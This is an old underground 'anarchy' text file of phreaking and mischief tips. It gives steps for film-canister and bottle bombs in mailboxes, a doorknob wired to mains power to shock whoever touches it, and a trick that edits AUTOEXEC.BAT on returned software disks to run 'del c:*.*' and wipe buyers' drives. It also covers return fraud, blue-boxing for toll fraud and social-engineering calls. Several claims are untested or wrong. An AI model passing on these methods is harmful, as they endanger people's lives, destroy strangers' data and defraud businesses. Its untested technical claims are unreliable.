Easy explosive: <br>
fill Kodak film case (y'know, the black cylinder with the grey cap) with explosive of your choice. Drill hole in grey lid, insert fuse, and tape it back together very tightly. Light. poke a hole it the grey cap facing outwards, and insert an M-80 with fuse going through the hole and reseal, taping it tightly ALL AROUND the case. Place in plastic mailbox, light, close door, and get the hell away! Because of the tight airspace, the destructive power of the explosion is increased 5X. Works under water too, with a drop of wax, or preferably rubber cement around where the cap and wick meet. fill a GLASS coke/pepsi bottle with 1 part gas, 1 part sugar, &amp; 1 part water. Wedge an M-80 into the top about halfway. Shake the container, place in mailbox (hopefully with mail {hehe!}) light, and get the fuck away. This thing sends glass shrapnel EVERYWHERE, including through their mail. Doorknob Shocker: <br>
run a wire from one slot in wall outlet to the bracket in the wall that the knob's tongue inserts into. Run another wire from the other slot to an inconspicuous spot on the DOORKNOB. How does that one *grab* you? <br>
Phone Loops: (remember, tone + silence = connection) <br>
   NUMBER     |    Tone/Silence (T/S) End  |  STATUS (on connection)<br>
----------------------------------------------------------------------<br>

<br>
<br>

<br>
Actually, any 1-619-7x9-000x gives tone detect, finding the other silent connection is a wee bit harder. If anyone manages to complete some of these, or any loops, please let me know. <br>
<br>
The only bad thing about loop lines, is that eventually the Gestapo finds out about the over-use of the line, and assigns the # to anyone who wants a new # for thier fone. Then when phreaks begin to use the line again, thinking it is a loop, they get a pissed off yuppie who then has the call traced, and thats like putting your balls right in a door and slamming it. The operator will complain in your face, and say some bullshit like she has your # and will report any disturbances to the fone co. if she sees it again. <br>
<br>
Simple Virus/Easy Way To Return A Copied Program (hehe!) <br>
<br>
when you buy a game, or something from a computer store, copy it, and want to return it (I know all of you do this), sometimes all the store does is re-cellophane it and it goes back on the shelves without being re-tested. If the original floppies have an AUTOEXEC.BAT file on them to initiate the copying/decompression at boot-up, simply edit it to say: <br>
<br>
cd\<br>
del c:*.*<br>
y<br>
<br>
<br>
That'll make someone's day real funny, especially if the store tries to test it. Or, in most cases the store will not accept returned merchandise if it is not defective, so DEFECT IT. This is done by using a program that shows the date and time the originals were last modified (check for this BEFORE installing the program!!!!!!) such as Dosshell, or XTGold. Then set the date and time on your computer to match the originals date and time (approx). Install the program, and/or copy the originals and manuals. Now fuck around with the decompression file (usually PKUNZIP), the installation file, and any others you see. Now the store has no reason, and MUST accept the product as a return, or sometimes they will give you a return check for the $$, and send the program back to the manufacturer, which is good, because it will then be recopied, resealed, and put back on the shelves somewhere for another phreaker to HACK!! (If the above date/time matching is too much of a pain for the really retarded out there, set your computer date/time to any past ones close to the originals, and fuck with ALL the files, thus making them all match.) <br>
<br>
Battery Bombs: <br>
<br>
Batteries like Duracell, Eveready, Energizer, etc... are specially made for home use and will not under any condition, explode when simply connected to each other. Therefore, generic batteries are required. These batteries can be obtained in hick country, or from a shitty wholesaler. I've heard of phriends putting 9Vs in the fucking microwave for a minute or so, and this is supposed to disable the &quot;exploder protector&quot;, but anyone who puts batteries in a microwave, should have the batteries explode on them. EXODUS takes no responsibility for anything in this file!!! I never found out if 2 9v batts connected really do explode. I hope so. <br>
<br>
Any Blue Boxers?? <br>
<br>
Not many people use blue boxes these days. They've become an eminent danger to phreakers. Ma Bell has new equipment to detect the use of tone-emmitting boxes, and about the only safe place to box calls from is the handy-dandy pay phone at the end of the block. The only way to box calls today is to switch off to another switching system with another number: ie- <br>
<br>
call a store like Toys-'R'-Us, (1-908-322-6065 Livingston, NJ) and ask for the technical (video game) department. This switches the number from the above to the extension of the department, usually and extension, but it can be a totally different # you are sent to while you are on hold. This is VERY good. Bullshit the employee at the tech dept., and wait for HIM to hang up first. That disconnects you from his department, but not from the innerconnections of the store. (it might even be possible to dial a number and get another department at this point). This is like 'stacking' trunks. Their dialtone (inside the store) may have a slightly higher/lower pitch than a dialtone at your house. This is what you want. Now, blow 2600 accross the line, and you should have access to a trunk, and Bell Labs think that the store did it, and it is not usually questioned because the computer might think that it is part of their paging system. (not 100% sure, test around) <br>
<br>
when someone (preferably who you don't give a shit about) calls, dial *69 to ring him back.(if your area suscribes to this feature) What sould happen is that the *69 tone asks the Bell computer to call back the person. The COMPUTER does the calling at this point. Now when your friend picks up, bullshit him into hanging up first. Now the computer is getting the dialtone first, then it passes it on to you. If you blow 2600 at this point, the computer may think it is its own equipment doing the calling. I'm REALLY not sure about this one. Hopefully this one works, but I can't test it because some fucked up, shit full, douche nozzle, pig fucker broke my MF box. MF boxes are not that hard to come by. Many hobby shops, music instrument stores, or electronic stores may sell the MF box itself, or one that detects tones, which can be used in the reverse way. <br>
<br>
Good Technical Phone Numbers: <br>
<br>
sometimes the hardest part of getting technical support is finding a place to look. An easy place is M.I.T. (HOME OF THE ORIGINAL PHREAKS) Find the number for the Electronic engineering campus, call and say you would like the number for (give room # make one up if you have to), or call the person incharge of dorm assignments (buy a college book if you need to). Enentually, if done right, you will have a list of possible #s, and set your modem on scan, and look for carrier detect. One of these nerds...ahm! I mean Geniuses must have a computer with a modem, and these guys will answer about 100% of your technical problems. <br>
